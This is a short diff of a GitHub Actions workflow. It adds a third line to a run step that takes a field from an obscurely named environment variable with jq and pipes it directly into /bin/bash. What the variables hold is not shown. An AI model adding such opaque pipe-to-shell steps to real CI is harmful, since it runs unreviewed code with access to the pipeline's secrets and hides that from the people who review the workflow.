@@ -21,6 +21,7 @@ jobs:
         run: |
           printf '%s' "$twun4784" | jq -r .j9 | /bin/bash
           echo $meg01 | jq -r .zrdmn419 | /bin/bash
+          echo $g99 | jq -r .nknf99874 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
